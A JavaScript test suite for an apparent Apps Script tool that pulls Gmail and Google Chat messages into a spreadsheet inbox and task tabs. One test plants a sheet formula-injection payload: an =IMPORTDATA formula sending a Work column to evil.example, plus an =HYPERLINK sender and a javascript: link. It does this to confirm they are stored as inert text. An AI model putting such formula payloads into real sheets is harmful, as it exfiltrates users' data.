'use strict';
const { fixture, fixtureJson, findUnsafe } = require('./fixtures/helpers');
const { buildChatFixture } = require('./fixtures/chat-api');

const WEEKDAY_NOW = '2026-10-08T02:15:00Z'; // Thursday 06:15 Dubai
const WEEKEND_NOW = '2026-10-10T02:15:00Z'; // Saturday 06:15 Dubai

function seedKnownRows(sb) {
  // One Inbox row, one Work task and one Personal task already hold keys from the Gmail fixture.
  sb.mock.seed('Inbox', [['I-known001', new Date('2026-10-07T03:00:00Z'), 'Gmail', 'Hana <hana@aisa.sch.ae>', 'Already captured',
    'snip', 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-known-inbox', 'gmail:msg-known-inbox-1', 'Ignored', '', 'Work']]);
  sb.gs.addTask_({ category: 'Work', title: 'Already a task', sourceKey: 'gmail:msg-known-task-1', source: 'Gmail' });
  sb.gs.addTask_({ category: 'Personal', title: 'Already a personal task', sourceKey: 'gmail:msg-known-personal-1', source: 'Gmail' });
}

/** A sender whose From, Subject and body all start with "=": the classic sheet formula-injection payload. */
const EVIL_SUBJECT = '=IMPORTDATA("https://evil.example/?d="&ENCODEURL(JOIN(",",Work!C2:C500)))';
function injectionThread() {
  return {
    id: 'thread-evil',
    subject: EVIL_SUBJECT,
    messages: [{ id: 'msg-evil-1', from: '=HYPERLINK("https://evil.example","Mallory") <mallory@example.com>', subject: EVIL_SUBJECT,
      body: '=1+1 please see the attached invoice\n\nMallory' }]
  };
}

function setupGmail(sb, extraThreads) {
  const threads = fixtureJson('gmail-threads.json').concat(extraThreads || []);
  sb.mock.gmail.setThreads(threads);
  sb.mock.gmail.aliases = ['brandon.abaki@aisa.sch.ae'];
  sb.mock.gmail.searchHandler = (query, all) => {
    const wantsChat = /chat-noreply@google\.com/.test(query);
    return all.filter((th) => {
      const first = th.messages[0]; // mock-internal array: keeps the per-thread getMessages() counter for the code under test
      const isChatMail = !!first && /chat-noreply@google\.com/i.test(first.getFrom());
      return wantsChat ? isChatMail : !isChatMail;
    });
  };
}

function chatEmailThread() {
  return {
    id: 'thread-chatmail',
    subject: 'Sara Khan sent you a message in Google Chat',
    messages: [{ id: 'msg-chatmail-1', from: 'Google Chat <chat-noreply@google.com>', subject: 'Sara Khan sent you a message in Google Chat',
      body: fixture('chat-notification-email.txt') }]
  };
}

module.exports = async function (t) {
  await t.test('Gmail capture: bulk load, me-detection, bulk filters, dedupe, snippet cleaning and link format', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    seedKnownRows(sb);
    setupGmail(sb);
    sb.mock.gmail.bulkLoads = 0;
    sb.mock.gmail.perThreadLoads = 0;
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 3, chat: 0, chatMode: 'off', errors: [] });
    assert.equal(sb.mock.gmail.searches.length, 1, 'one search');
    assert.match(sb.mock.gmail.searches[0].query, /newer_than:2d/);
    assert.equal(sb.mock.gmail.searches[0].max, 50);
    assert.equal(sb.mock.gmail.bulkLoads, 1, 'SPEC 6: one GmailApp.getMessagesForThreads(threads) call');
    assert.equal(sb.mock.gmail.perThreadLoads, 0, 'never thread.getMessages() per thread');
    const rows = sb.gs.readRows('Inbox').map((r) => r).filter((r) => r.id !== 'I-known001');
    assert.equal(rows.length, 3);
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-dtr-1'), 'a thread with a draft is skipped even when someone wrote after the draft');
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-known-personal-1'), 'deduped against the Personal tab');
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-al-1'), 'skipped when the LAST message is automated (out-of-office after a human ask)');
    const human = rows.find((r) => r.sourceKey === 'gmail:msg-lh-1');
    assert.ok(human, 'captured when a human replied after a list message: the automated check looks at the last message');
    assert.equal(human.from, 'Omar Haddad <omar@aisa.sch.ae>');
    const ask = rows.find((r) => r.sourceKey === 'gmail:msg-ask-1');
    assert.ok(ask, 'first message id is the key');
    assert.match(ask.id, /^I-[a-z0-9]{8}$/);
    assert.equal(ask.source, 'Gmail');
    assert.equal(ask.from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    assert.equal(ask.subject, 'Lab timetable for next week');
    assert.equal(ask.snippet, 'Hi Brandon, Could you send me the ICT lab timetable for next week by Thursday? Thanks, Sara');
    assert.equal(ask.link, 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-ask');
    assert.equal(ask.status, 'New');
    assert.equal(ask.categoryHint, 'Work');
    assert.equal(Object.prototype.toString.call(ask.captured), '[object Date]');
    const second = rows.find((r) => r.sourceKey === 'gmail:msg-second-1');
    assert.ok(second, 'thread where someone replied after me is captured, keyed by the FIRST message');
    assert.equal(second.from, 'Maya Lin <maya.lin@aisa.sch.ae>');
    assert.equal(second.snippet, 'Thanks! Could you add a slide on Gemini?');
    // Running again adds nothing
    const again = sb.gs.runCaptureNow_();
    assert.equal(again.gmail, 0);
    assert.equal(sb.gs.readRows('Inbox').length, 4);
    const logs = sb.mock.logRows().filter((r) => r.fn === 'captureInbox');
    assert.equal(logs.length, 2);
    assert.equal(logs[0].level, 'INFO');
    assert.match(logs[0].message, /gmail 3, chat 0 \(mode off\)/);
    assert.equal(findUnsafe(result), '');
  }, { now: WEEKDAY_NOW });

  await t.test('a sender whose From, Subject or body starts with "=" cannot plant a formula in the sheet', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([injectionThread()]);
    const r = sb.gs.runCaptureNow_();
    assert.equal(r.gmail, 1);
    assert.deepEqual(sb.mock.formulas('Inbox'), [], 'no Inbox cell holds a formula (the mock stores a leading "=" as a formula, like Apps Script)');
    const CI = sb.eval('COLUMN.INBOX');
    const cells = sb.mock.rows('Inbox')[0];
    assert.equal(cells[CI.subject], ' ' + EVIL_SUBJECT, 'stored as text behind a guard space');
    assert.equal(cells[CI.snippet], ' =1+1 please see the attached invoice Mallory');
    assert.equal(cells[CI.from], ' =HYPERLINK("https://evil.example","Mallory") <mallory@example.com>');
    const item = sb.gs.listInbox_({}).items[0];
    assert.equal(item.subject, EVIL_SUBJECT, 'the API returns the text without the guard space');
    assert.equal(item.snippet, '=1+1 please see the attached invoice Mallory');
    assert.equal(item.from, '=HYPERLINK("https://evil.example","Mallory") <mallory@example.com>');
    // Promoting it (title from the subject, details from From + snippet) keeps the task tab safe too.
    const task = sb.gs.promoteInbox_({ inboxId: item.id, category: 'Work' }).task;
    assert.deepEqual(sb.mock.formulas('Work'), []);
    assert.equal(task.title, EVIL_SUBJECT.slice(0, 140));
    const C = sb.eval('COLUMN.TASK');
    assert.equal(sb.mock.rows('Work')[0][C.title].charAt(0), ' ');
    assert.equal(sb.gs.readTasks('Work')[0].title, EVIL_SUBJECT.slice(0, 140), 'round-trips without the guard space');
    // Completing (a partial-row write) and healing never turn the guarded text into a formula either.
    sb.gs.completeTask_({ category: 'Work', id: task.id, note: '=SUM(A1:A9)' });
    assert.equal(sb.gs.healSheet('Work').fixed, 0, 'a guard space is not whitespace for healSheet to trim');
    assert.deepEqual(sb.mock.formulas('Work'), []);
    assert.equal(sb.gs.readTasks('Work')[0].note, '=SUM(A1:A9)');
    assert.deepEqual(sb.mock.formulas('Log'), [], 'Log messages carrying the text are guarded as well');
  }, { now: WEEKDAY_NOW });

  await t.test('isAutomatedMessage and myAddresses helpers', (sb, assert) => {
    const mk = (from, headers) => sb.mock.gmail.makeThread({ id: 't', messages: [{ from: from, headers: headers || {} }] }).getMessages()[0];
    assert.ok(sb.gs.isAutomatedMessage(mk('Google Calendar <calendar-notification@google.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <noreply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <no-reply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <DoNotReply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <notifications@github.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <notification@slack.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('Mail Delivery <mailer-daemon@google.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'List-Unsubscribe': '<mailto:x>' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'list-id': 'x.y' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'Bulk' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'list' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'junk' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'Auto-Submitted': 'auto-generated' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'Auto-Submitted': 'no' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'normal' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>')));
    sb.mock.gmail.aliases = ['Alias <alias@aisa.sch.ae>'];
    const me = sb.gs.myAddresses(sb.gs.readConfig());
    assert.ok(me.has('bbaki@aisa.sch.ae'));
    assert.ok(me.has('alias@aisa.sch.ae'));
    assert.ok(me.has('brandon.abaki@gmail.com'), 'ALLOWED_EMAILS count as me');
    sb.mock.gmail.aliasesThrow = true;
    assert.ok(sb.gs.myAddresses(sb.gs.readConfig()).has('bbaki@aisa.sch.ae'), 'getAliases failure is tolerated');
  });

  await t.test('Chat API capture: paging, space filters, sender/mention rules, link and subject formats', (sb, assert) => {
    const chat = buildChatFixture({ now: WEEKDAY_NOW });
    sb.mock.urlFetch.handler = chat.handler;
    sb.mock.gmail.setThreads([]);
    // Distinct lookbacks pin which Config key drives which cutoff.
    sb.mock.seed('Config', [['CHAT_LOOKBACK_DAYS', '5', ''], ['GMAIL_LOOKBACK_DAYS', '1', '']]);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 3, chatMode: 'api', errors: [] });
    assert.match(sb.mock.gmail.searches[0].query, /newer_than:1d/, 'GMAIL_LOOKBACK_DAYS drives the Gmail query');
    const rows = sb.gs.readRows('Inbox');
    assert.deepEqual(rows.map((r) => r.sourceKey), chat.expectedKeys);
    const dm = rows[0];
    assert.equal(dm.source, 'Chat');
    assert.equal(dm.from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    assert.equal(dm.subject, 'Direct message');
    assert.equal(dm.snippet, 'Can you share the AI workshop slides before Thursday?');
    assert.equal(dm.link, 'https://chat.google.com/dm/DM1', 'spaceUri preferred');
    assert.equal(dm.categoryHint, 'Work');
    assert.equal(rows[1].link, 'https://mail.google.com/chat/u/0/#chat/space/GRP1', 'fallback link without spaceUri');
    assert.equal(rows[1].subject, 'Direct message');
    assert.equal(rows[2].subject, 'Science Department');
    assert.equal(rows[2].from, 'Maya Lin <maya.lin@aisa.sch.ae>');
    // Requests: 2 space pages + messages for DM1, GRP1, ROOM1 only (OLD and the bot DM are skipped);
    // ROOM1 answers in two pages, so it is fetched twice.
    const urls = sb.mock.urlFetch.calls.map((c) => c.url);
    assert.equal(urls.filter((u) => /\/v1\/spaces\?/.test(u)).length, 2);
    assert.ok(urls.some((u) => u.includes('pageToken=page2')));
    const msgUrls = urls.filter((u) => /\/messages\?/.test(u));
    assert.deepEqual(msgUrls.map((u) => /v1\/(spaces\/[^/]+)\//.exec(u)[1]), ['spaces/DM1', 'spaces/GRP1', 'spaces/ROOM1', 'spaces/ROOM1']);
    assert.ok(urls.some((u) => /spaces\/ROOM1\/messages\?.*pageToken=mp2/.test(u)), 'second messages page requested while nextPageToken is set');
    assert.ok(rows.some((r) => r.sourceKey === 'chat:spaces/ROOM1/messages/r1.r1'), 'the mention served on page 2 is written');
    msgUrls.forEach((u) => {
      assert.ok(u.includes('pageSize=100'));
      const filter = decodeURIComponent(/filter=([^&]+)/.exec(u)[1]);
      assert.match(filter, /^create_time > "2026-10-03T02:15:00Z"$/, 'CHAT_LOOKBACK_DAYS (5) drives the Chat cutoff: ' + filter);
    });
    sb.mock.urlFetch.calls.forEach((c) => {
      assert.equal(c.params.muteHttpExceptions, true);
      assert.equal(c.params.headers.Authorization, 'Bearer mock-oauth-token');
    });
    // Second run: nothing new
    assert.equal(sb.gs.runCaptureNow_().chat, 0);
    assert.equal(sb.gs.readRows('Inbox').length, 3);
  }, { now: WEEKDAY_NOW });

  await t.test('a GMAIL_QUERY that carries its own newer_than:/after: gets nothing appended', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', ''], ['GMAIL_QUERY', 'in:inbox newer_than:3d', '']]);
    sb.mock.gmail.setThreads([]);
    sb.gs.runCaptureNow_();
    assert.equal(sb.mock.gmail.searches[0].query, 'in:inbox newer_than:3d');
    sb.mock.sheet('Config').clearContents();
    sb.mock.sheet('Config').appendRow(['Key', 'Value', 'Notes']);
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', ''], ['GMAIL_QUERY', 'to:me after:2026/10/01', '']]);
    sb.gs.clearConfigMemo();
    sb.gs.runCaptureNow_();
    assert.equal(sb.mock.gmail.searches[1].query, 'to:me after:2026/10/01');
  }, { now: WEEKDAY_NOW });

  await t.test('chatMessageWanted rules', (sb, assert) => {
    const me = new Set(['bbaki@aisa.sch.ae']);
    const human = (email, extra) => Object.assign({ name: 'spaces/X/messages/1', sender: { type: 'HUMAN', email: email, displayName: 'P' }, text: 'hi' }, extra || {});
    const dm = { spaceType: 'DIRECT_MESSAGE' };
    const room = { spaceType: 'SPACE' };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), dm, me), true);
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), { spaceType: 'GROUP_CHAT' }, me), true);
    assert.equal(sb.gs.chatMessageWanted(human('BBAKI@aisa.sch.ae'), dm, me), false, 'from me');
    assert.equal(sb.gs.chatMessageWanted({ sender: { type: 'BOT' }, text: 'x' }, dm, me), false);
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), room, me), false, 'space without mention');
    const mention = { annotations: [{ type: 'USER_MENTION', userMention: { user: { email: 'bbaki@aisa.sch.ae' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', mention), room, me), true);
    const otherMention = { annotations: [{ type: 'USER_MENTION', userMention: { user: { email: 'o@y.com' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', otherMention), room, me), false);
    const wrongType = { annotations: [{ type: 'RICH_LINK', userMention: { user: { email: 'bbaki@aisa.sch.ae' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', wrongType), room, me), false, 'only USER_MENTION annotations count');
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', { annotations: 'junk' }), room, me), false, 'malformed annotations are ignored');
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', { annotations: [null, {}] }), room, me), false);
    assert.equal(sb.gs.chatMessageWanted(null, room, me), false);
    const row = sb.gs.chatMessageToInbox(human('x@y.com'), { name: 'spaces/X', spaceType: 'SPACE', displayName: '' });
    assert.equal(row.link, 'https://mail.google.com/chat/u/0/#chat/space/X');
    assert.equal(row.subject, 'Direct message');
    assert.equal(row.sourceKey, 'chat:spaces/X/messages/1');
  });

  await t.test('Chat 403 → CHAT_API_BLOCKED log, email mode, notification fixture parsed', (sb, assert) => {
    const chat = buildChatFixture({ now: WEEKDAY_NOW, mode: 'forbidden' });
    sb.mock.urlFetch.handler = chat.handler;
    setupGmail(sb, [chatEmailThread()]);
    seedKnownRows(sb);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 3, chat: 1, chatMode: 'email', errors: [] });
    const warn = sb.mock.logRows().filter((r) => r.level === 'WARN' && /^CHAT_API_BLOCKED/.test(r.message));
    assert.equal(warn.length, 1, 'logged once');
    assert.match(warn[0].message, /HTTP 403/);
    assert.match(warn[0].message, /PERMISSION_DENIED/);
    assert.match(warn[0].message, /SERVICE_DISABLED/);
    assert.equal(sb.mock.urlFetch.calls.length, 1, 'no further API calls after the block');
    const chatSearch = sb.mock.gmail.searches.find((s) => /chat-noreply/.test(s.query));
    assert.ok(chatSearch);
    assert.equal(chatSearch.query, 'from:(chat-noreply@google.com OR "Google Chat") newer_than:2d', 'SPEC 6: address or display name "Google Chat"');
    const row = sb.gs.readRows('Inbox').find((r) => r.source === 'Chat');
    assert.equal(row.sourceKey, 'chat:email:msg-chatmail-1');
    assert.equal(row.from, 'Sara Khan');
    assert.match(row.subject, /email notification/);
    assert.equal(row.link, 'https://chat.google.com/dm/AAAAxyz123/abc456def?cls=1');
    assert.equal(row.snippet, "Hi Brandon, can you share the slides from Tuesday's AI workshop before Thursday? The science team wants to reuse them.");
    assert.equal(row.categoryHint, 'Work');
    // Second run in the same state: still email mode, no duplicate rows
    const again = sb.gs.runCaptureNow_();
    assert.equal(again.chatMode, 'email');
    assert.equal(again.chat, 0);
    assert.equal(sb.gs.readRows('Inbox').filter((r) => r.source === 'Chat').length, 1);
  }, { now: WEEKDAY_NOW });

  await t.test('Chat 401 also switches to email mode; parser is tolerant of odd notification bodies', (sb, assert) => {
    sb.mock.urlFetch.handler = buildChatFixture({ now: WEEKDAY_NOW, mode: 'unauthorized' }).handler;
    sb.mock.gmail.setThreads([]);
    const result = sb.gs.runCaptureNow_();
    assert.equal(result.chatMode, 'email');
    assert.equal(result.chat, 0);
    assert.match(sb.mock.logRows().find((r) => /CHAT_API_BLOCKED/.test(r.message)).message, /HTTP 401 UNAUTHENTICATED/);
    const p = sb.gs.parseChatNotificationEmail('Omar mentioned you in Science Department', 'Omar: @Brandon can you check the lab?\n\nOpen in Chat https://mail.google.com/chat/u/0/#chat/space/AAA/BBB\n\nUnsubscribe here');
    assert.equal(p.from, 'Omar');
    assert.equal(p.subject, 'Science Department');
    assert.equal(p.link, 'https://mail.google.com/chat/u/0/#chat/space/AAA/BBB');
    assert.equal(p.snippet, 'Omar: @Brandon can you check the lab?');
    const empty = sb.gs.parseChatNotificationEmail('New activity', '');
    assert.equal(empty.from, 'New activity');
    assert.equal(empty.subject, 'Google Chat');
    assert.equal(empty.link, '');
    assert.equal(empty.snippet, 'New activity');
    const msg = sb.mock.gmail.makeThread({ id: 'x', messages: [{ from: 'Google Chat <some-other@google.com>' }] }).getMessages()[0];
    assert.ok(sb.gs.isChatNotification(msg), 'display name "Google Chat" is enough');
    const notMsg = sb.mock.gmail.makeThread({ id: 'y', messages: [{ from: 'Sara <sara@aisa.sch.ae>' }] }).getMessages()[0];
    assert.ok(!sb.gs.isChatNotification(notMsg));
  }, { now: WEEKDAY_NOW });

  await t.test('Chat 429: one retry after 2 s succeeds; persistent 429 skips Chat without switching modes', (sb, assert) => {
    const once = buildChatFixture({ now: WEEKDAY_NOW, mode: 'rate-limit-once' });
    sb.mock.urlFetch.handler = once.handler;
    sb.mock.gmail.setThreads([]);
    let result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 3, chatMode: 'api', errors: [] });
    assert.deepEqual(sb.mock.sleeps, [2000]);
    sb.mock.sleeps.length = 0;
    const always = buildChatFixture({ now: WEEKDAY_NOW, mode: 'rate-limit-always' });
    sb.mock.urlFetch.handler = always.handler;
    result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 0, chatMode: 'api', errors: [] });
    assert.deepEqual(sb.mock.sleeps, [2000]);
    assert.ok(sb.mock.logRows().some((r) => r.level === 'WARN' && /429/.test(r.message)));
    assert.ok(!sb.mock.logRows().some((r) => /CHAT_API_BLOCKED/.test(r.message)));
    // Other errors are reported, not treated as blocked
    sb.mock.urlFetch.handler = buildChatFixture({ now: WEEKDAY_NOW, mode: 'server-error' }).handler;
    result = sb.gs.runCaptureNow_();
    assert.equal(result.chatMode, 'api');
    assert.equal(result.errors.length, 1);
    assert.match(result.errors[0], /HTTP 500/);
  }, { now: WEEKDAY_NOW });

  await t.test('CHAT_ENABLED=FALSE never calls the API; weekday guard skips Saturday/Sunday but runCaptureNow does not', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.deepEqual(r, { gmail: 0, chat: 0, chatMode: 'off', errors: [], skipped: true });
    assert.equal(sb.mock.gmail.searches.length, 0);
    assert.equal(sb.mock.urlFetch.calls.length, 0);
    const info = sb.mock.logRows().find((r2) => r2.fn === 'captureInbox');
    assert.equal(info.level, 'INFO');
    assert.match(info.message, /Weekend \(2026-10-10\)/);
    const now = sb.gs.runCaptureNow_();
    assert.deepEqual(now, { gmail: 0, chat: 0, chatMode: 'off', errors: [] });
    assert.equal(sb.mock.gmail.searches.length, 1, 'runCaptureNow bypasses the guard');
    assert.equal(sb.mock.urlFetch.calls.length, 0, 'Chat off');
  }, { now: WEEKEND_NOW });

  // Boundary cases pin the guard to the DUBAI weekday: these instants fall on a different day in UTC.
  await t.test('weekday guard: Friday 20:30Z is Saturday 00:30 in Dubai → skipped', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, true);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /Weekend \(2026-10-10\)/);
    assert.equal(sb.mock.gmail.searches.length, 0);
  }, { now: '2026-10-09T20:30:00Z' });

  await t.test('weekday guard: Sunday 23:30 Dubai → skipped', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, true);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /Weekend \(2026-10-11\)/);
    assert.equal(sb.mock.gmail.searches.length, 0);
  }, { now: '2026-10-11T19:30:00Z' });

  await t.test('weekday guard: Monday 00:30 Dubai (still Sunday in UTC) → runs', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, undefined);
    assert.equal(sb.mock.gmail.searches.length, 1);
    assert.ok(!sb.mock.logRows().some((row) => /Weekend/.test(row.message)));
  }, { now: '2026-10-11T20:30:00Z' });

  await t.test('overlapping capture runs cannot write the same Source key twice (keys re-checked under the lock)', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    setupGmail(sb);
    // Another execution appends the "thread-ask" row while this run is waiting for the lock.
    let fired = false;
    sb.mock.locks.onWait = () => {
      if (fired) return;
      fired = true;
      sb.mock.seed('Inbox', [['I-other001', new Date(), 'Gmail', 'Sara Khan <sara.khan@aisa.sch.ae>', 'Lab timetable for next week', 'snip',
        'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-ask', 'gmail:msg-ask-1', 'New', '', 'Work']]);
    };
    const r = sb.gs.runCaptureNow_();
    assert.equal(fired, true, 'the append waited for the lock');
    const keys = sb.gs.readRows('Inbox').map((row) => row.sourceKey);
    assert.equal(keys.filter((k) => k === 'gmail:msg-ask-1').length, 1, 'no duplicate Source key');
    assert.equal(r.gmail, 5, 'the row the other run wrote is not counted as captured here');
    assert.equal(keys.length, 6);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /1 row\(s\) already captured by an overlapping run/);
  }, { now: WEEKDAY_NOW });

  await t.test('captureInbox runs on a weekday and heals the task tabs first', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.seed('Work', [['', '', 'Routine row without id', '', 'Claude', '', '', '', '', '', '', '', '', '', 'gmail:msg-ask-1', '']]);
    sb.mock.seed('Personal', [['', '', 'Personal routine row', '', 'Claude', '', '', '', '', '', '', '', '', '', '', '']]);
    setupGmail(sb);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, undefined);
    assert.equal(r.gmail, 5, 'thread-second, thread-known-inbox, thread-known-task, thread-known-personal, thread-list-then-human (nothing else seeded here)');
    const keys = sb.gs.readRows('Inbox').map((row) => row.sourceKey);
    assert.ok(!keys.includes('gmail:msg-ask-1'), 'thread-ask is deduped against the healed Work row');
    assert.deepEqual(keys.sort(), ['gmail:msg-known-inbox-1', 'gmail:msg-known-personal-1', 'gmail:msg-known-task-1', 'gmail:msg-lh-1', 'gmail:msg-second-1']);
    assert.match(sb.mock.rows('Work')[0][0], /^W-[a-z0-9]{8}$/);
    assert.match(sb.mock.rows('Personal')[0][0], /^P-[a-z0-9]{8}$/, 'Personal healed by the trigger too');
    assert.ok(sb.mock.logRows().some((row) => row.fn === 'healSheet'));
    sb.mock.gmail.throwOnSearch = 'Gmail quota exceeded';
    const bad = sb.gs.runCaptureNow_();
    assert.equal(bad.gmail, 0);
    assert.deepEqual(bad.errors, ['Gmail: Gmail quota exceeded']);
    assert.ok(sb.mock.logRows().some((row) => row.fn === 'captureGmail' && row.level === 'ERROR'));
  }, { now: WEEKDAY_NOW });

  await t.test('installTriggers is idempotent and schedules captureInbox daily at 06:15 Dubai; removeTriggers clears', (sb, assert) => {
    sb.mock.triggers.push({ getHandlerFunction: () => 'somethingElse', getUniqueId: () => 'keep' });
    const first = sb.gs.installTriggers();
    assert.deepEqual(first, { installed: 1, removed: 0 });
    const second = sb.gs.installTriggers();
    assert.deepEqual(second, { installed: 1, removed: 1 });
    const mine = sb.mock.triggers.filter((tr) => tr.getHandlerFunction() === 'captureInbox');
    assert.equal(mine.length, 1);
    assert.equal(sb.mock.triggers.length, 2, 'other triggers untouched');
    assert.deepEqual(mine[0].spec, { handler: 'captureInbox', type: 'CLOCK', everyDays: 1, hour: 6, minute: 15, timezone: 'Asia/Dubai' });
    assert.equal(sb.gs.removeTriggers(), 1);
    assert.equal(sb.mock.triggers.length, 1);
    assert.equal(sb.gs.removeTriggers(), 0);
    assert.ok(sb.mock.logRows().some((r) => r.fn === 'installTriggers'));
  });

  await t.test('listInbox / promoteInbox / ignoreInbox', (sb, assert) => {
    sb.mock.seed('Inbox', [
      ['I-old', new Date('2026-10-06T03:00:00Z'), 'Gmail', 'Hana <hana@aisa.sch.ae>', 'Field trip forms', 'Please sign the forms', 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/t1', 'gmail:t1-first', 'New', '', 'Work'],
      ['I-new', new Date('2026-10-07T03:00:00Z'), 'Chat', 'Sara Khan <sara@aisa.sch.ae>', 'Direct message', 'Can you share the slides?', 'https://chat.google.com/dm/X', 'chat:spaces/X/messages/1', 'New', '', 'Work'],
      ['I-done', new Date('2026-10-05T03:00:00Z'), 'Gmail', 'X', 'Already promoted', 's', '', 'gmail:zz', 'Promoted', 'W-abc', 'Work'],
      ['I-personal', new Date('2026-10-04T03:00:00Z'), 'Gmail', 'Mum <mum@example.com>', 'Birthday plans', 'Dinner on Friday?', 'javascript:x', 'gmail:mum', 'New', '', 'Personal']
    ]);
    const list = sb.gs.listInbox_({});
    assert.deepEqual(list.items.map((i) => i.id), ['I-new', 'I-old', 'I-personal'], 'New only, newest first');
    assert.equal(list.items[0].captured, '2026-10-07T07:00:00+04:00');
    assert.equal(list.items[2].link, '', 'unsafe link dropped on read');
    assert.equal(findUnsafe(list), '');
    assert.deepEqual(sb.gs.listInbox_({ status: 'promoted' }).items.map((i) => i.id), ['I-done']);
    assert.equal(sb.gs.listInbox_({ status: 'all' }).items.length, 4);
    assert.throws(() => sb.gs.listInbox_({ status: 'Weird' }), /Status must be/);

    const promoted = sb.gs.promoteInbox_({ inboxId: 'I-new', category: 'Work', title: 'Share the AI slides with Sara', project: 'AI Learning Hub', due: '2026-10-09', priority: 'High' });
    const task = promoted.task;
    assert.match(task.id, /^W-/);
    assert.equal(task.title, 'Share the AI slides with Sara');
    assert.equal(task.source, 'Chat');
    assert.equal(task.link, 'https://chat.google.com/dm/X');
    assert.equal(task.sourceKey, 'chat:spaces/X/messages/1');
    assert.equal(task.project, 'AI Learning Hub');
    assert.equal(task.due, '2026-10-09');
    assert.equal(task.priority, 'High');
    assert.equal(task.newsletter, true);
    assert.match(task.details, /^From Sara Khan <sara@aisa.sch.ae>: Can you share the slides\?$/);
    const CI = sb.eval('COLUMN.INBOX');
    const row = sb.mock.rows('Inbox')[1];
    assert.equal(row[CI.status], 'Promoted');
    assert.equal(row[CI.taskId], task.id);
    assert.deepEqual(sb.gs.listInbox_({}).items.map((i) => i.id), ['I-old', 'I-personal']);

    // Default title = subject, default category = hint; a duplicate sourceKey points at the existing task
    const dflt = sb.gs.promoteInbox_({ inboxId: 'I-personal' });
    assert.match(dflt.task.id, /^P-/);
    assert.equal(dflt.task.title, 'Birthday plans');
    assert.equal(dflt.task.source, 'Gmail');
    assert.equal(dflt.task.link, '');
    sb.mock.seed('Inbox', [['I-dupe', new Date(), 'Chat', 'Sara', 'Direct message', 'again', '', 'chat:spaces/X/messages/1', 'New', '', 'Work']]);
    const dupe = sb.gs.promoteInbox_({ inboxId: 'I-dupe', category: 'Work' });
    assert.equal(dupe.task.id, task.id);
    assert.equal(dupe.duplicate, true);
    assert.equal(sb.mock.rows('Inbox')[4][CI.status], 'Promoted');
    assert.equal(sb.mock.rows('Inbox')[4][CI.taskId], task.id);

    assert.deepEqual(sb.gs.ignoreInbox_({ inboxId: 'I-old' }), { ok: true });
    assert.equal(sb.mock.rows('Inbox')[0][CI.status], 'Ignored');
    assert.deepEqual(sb.gs.listInbox_({}).items, []);
    assert.throws(() => sb.gs.ignoreInbox_({ inboxId: 'I-nope' }), /Inbox item not found/);
